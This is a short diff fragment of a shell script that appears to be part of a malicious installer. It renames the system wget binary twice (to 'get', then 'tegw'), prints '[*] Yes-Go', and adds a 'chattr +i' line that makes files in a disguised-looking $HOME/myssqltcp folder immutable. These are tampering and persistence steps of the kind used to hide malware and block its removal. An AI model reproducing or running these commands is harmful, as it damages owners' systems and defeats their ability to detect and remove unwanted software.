@@ -98,3 +98,4 @@ mv /usr/bin/wget /usr/bin/get
 mv /usr/bin/get /usr/bin/tegw
 
 echo "[*] Yes-Go"
+chattr +i $HOME/myssqltcp/*
